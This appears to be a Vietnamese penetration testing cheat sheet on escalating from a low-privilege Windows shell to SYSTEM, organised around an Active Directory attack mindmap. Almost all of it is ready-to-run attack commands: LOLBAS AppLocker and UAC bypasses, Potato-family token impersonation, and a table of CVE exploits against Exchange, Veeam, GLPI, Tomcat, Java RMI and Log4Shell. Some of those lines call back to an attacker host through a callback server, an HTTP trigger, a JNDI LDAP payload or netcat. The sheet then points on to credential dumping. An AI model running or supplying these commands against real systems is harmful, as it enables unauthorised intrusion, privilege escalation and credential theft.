# 04 — Low access (Privilege escalation)

**Trạng thái:** có **shell quyền thấp** trên một máy Windows (qua creds, exploit
web/service, hoặc lateral). **Mục tiêu:** lên **Admin/SYSTEM** trên máy đó. Cột
"Low access (Privilege escalation)" của mindmap.

---

## A. Thu thập thông tin & Auto Enum

> **Khi nào chạy:** ngay khi có shell.
> **Tại sao:** tìm nhanh đường privesc (service sai quyền, token, credential file).

```powershell
winPEASany_ofs.exe                                   # liệt kê mọi vector
.\PrivescCheck.ps1; Invoke-PrivescCheck -Extended
Import-Module .\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'
```

```bash
# Scan AD toàn cục để tìm điểm yếu (box mindmap "Scan Auto")
PingCastle.exe --healthcheck --server <domain>
```

- **Kết quả:** danh sách vector ưu tiên (unquoted service, writable path, token
  privilege, AlwaysInstallElevated, autologon, credential file).

### AppLocker enumeration + bypass

> **Khi nào chạy:** khi bị chặn chạy binary/script.
> **Tại sao:** biết chính sách AppLocker để chọn LOLBAS bypass.

```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe   # (dll/msi/...)
# Bypass bằng LOLBAS (box mindmap):
installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe
mshta.exe my.hta
MsBuild.exe pshell.xml
msdt.exe ; wsreset.exe ; fodhelper.exe ; Fodhelper.exe   # cũng dùng cho UAC bypass
```

---

## B. SeImpersonate → SYSTEM (Potato family)

> **Khi nào chạy:** shell có **SeImpersonatePrivilege** (tài khoản dịch vụ:
> IIS/MSSQL/web) — box mindmap **"From Service account (SEImpersonate)"**.
> **Tại sao:** mạo danh token SYSTEM qua named pipe/RPC.

```powershell
GodPotato -cmd "cmd /c whoami"
PrintSpoofer.exe -i -c cmd
RoguePotato.exe ...
RemotePotato0.exe ...        # relay cross-session
JuicyPotatoNG / SweetPotato  # dự phòng
```

- **Kết quả:** box **"Authority/System"** → SYSTEM trên máy → dump creds (file 07).

---

## C. UAC bypass

> **Khi nào chạy:** là admin nhưng token bị UAC giới hạn (medium integrity).
> **Tại sao:** nâng lên high integrity để thao tác đầy đủ.

```powershell
fodhelper.exe ; wsreset.exe ; msdt.exe              # auto-elevate binaries
```

---

## D. Known local vulnerabilities / Service exploits

> **Khi nào chạy:** máy chạy service/phần mềm dính CVE. Mindmap liệt kê nhiều
> đường "Low access" qua ứng dụng → thường cho shell rồi privesc tiếp.

| Phần mềm / box | Lệnh (mindmap) | CVE |
|----------------|----------------|-----|
| **Exchange ProxyShell** | `proxyshell_rce.py -u https://<exchange> -e administrator@<domain>` | ProxyShell |
| **Exchange ProxyNotShell** | `poc_aug3.py <host> <user> <password> <command>` | CVE-2022-41040/41082 |
| **Veeam** | `VeeamHax.exe --target <veeam_server>` | CVE-2023-27532 |
| Veeam (auth bypass) | `CVE-2024-29849.py --target https://<veeam_ip>:<port>/ --callback-server <attacker_ip>:<port>` | CVE-2024-29849 |
| Veeam Orchestrator | `CVE-2024-29855.py --target https://<veeam_ip>:<port>/ ...` | CVE-2024-29855 |
| Veeam (unserialize) | `CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>` | CVE-2024-40711 |
| **GLPI** | `cve_2023_41320.py -u <user> -p <password> -t <ip>` | CVE-2023-41320 / CVE-2022-35914 (`htmLawedTest.php`) |
| **Tomcat/JBoss** | `msf> exploit/multi/http/tomcat_mgr_deploy` | ⚠️ msf |
| **Java RMI** | `msf> use exploit/multi/misc/java_rmi_server` | ⚠️ msf |
| **Java deserialized** | `ysoserial.jar <gadget> '<cmd>' \| nc <ip> <port>` | — |
| **Log4Shell** | `${jndi:ldap://<ip>:<port>/o=reference}` | CVE-2021-44228 |

- **Kết quả:** shell (thường low → rồi Potato → SYSTEM; hoặc trực tiếp SYSTEM).
- **Weak websites/services / Database:** box mindmap nhắc dùng `nuclei`, `nessus`,
  `msf> auxiliary/admin/mssql/mssql_enum_sql_logins` để tìm điểm vào ứng dụng.

---

## E. Sau khi lên Admin/SYSTEM

→ **Dump credential** ([file 07](07-credentials-harvesting.md)): LSASS, SAM, LSA,
DPAPI → credential mới → quay lại [file 03](03-valid-credentials-enum.md) và lan ngang.

## Checklist "Low access"

- [ ] `whoami /priv` → SeImpersonate? → Potato → SYSTEM
- [ ] winPEAS / PrivescCheck / adPEAS
- [ ] AppLocker? → LOLBAS bypass
- [ ] UAC bypass nếu cần high integrity
- [ ] Service/app dính CVE? (Exchange/Veeam/GLPI/Tomcat/Log4Shell)
- [ ] Lên admin → dump creds (file 07)
